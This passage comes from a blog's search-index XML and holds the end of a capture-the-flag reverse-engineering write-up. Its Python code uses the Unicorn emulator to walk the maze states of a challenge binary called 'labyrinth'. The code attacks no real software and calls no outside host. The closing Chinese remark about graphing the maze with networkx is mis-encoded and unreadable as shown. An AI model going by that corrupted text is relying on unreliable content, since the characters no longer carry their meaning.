<span class="built_in">open</span>(<span class="string">&#x27;.\\labyrinth&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">    uc.emu_start(CODE + switchers[idx], end)</span><br><span class="line">    uc.hook_del(hook1_handle)</span><br><span class="line">    hook2_handle = uc.hook_add(UC_HOOK_CODE, hook2)</span><br><span class="line">    uc.mem_write(STACK, <span class="string">b&#x27;\x00&#x27;</span> * PAGE)</span><br><span class="line">    new_ctx  = uc.context_save()</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> nodes:</span><br><span class="line">        node_sym = <span class="built_in">hex</span>(node)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">for</span> o <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            node_op = move[o]</span><br><span class="line">            uc.context_restore(new_ctx)</span><br><span class="line">            uc.reg_write(UC_X86_REG_RIP, CODE + node + <span class="number">0xC</span>)</span><br><span class="line">            uc.reg_write(UC_X86_REG_EAX, o)</span><br><span class="line">            uc.emu_start(CODE + node + <span class="number">0xC</span>, end)</span><br></pre></td></tr></table></figure>

<p>åé¢è¿˜ç”¨networkxç”»å‡ºäº†å›¾ ä½†æ˜¯å› ä¸ºèŠ‚ç‚¹å’Œè¾¹å¤ªå¤šçœ‹èµ·æ¥è¿˜æ˜¯å¾ˆæŠ½è±¡ è€Œä¸”å†™å®Œçš„æ—¶å€™å‘ç°å¤§å“¥å·²ç»å‡ºäº†(</p>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Unicorn</tag>
      </tags>
  </entry>
</search>
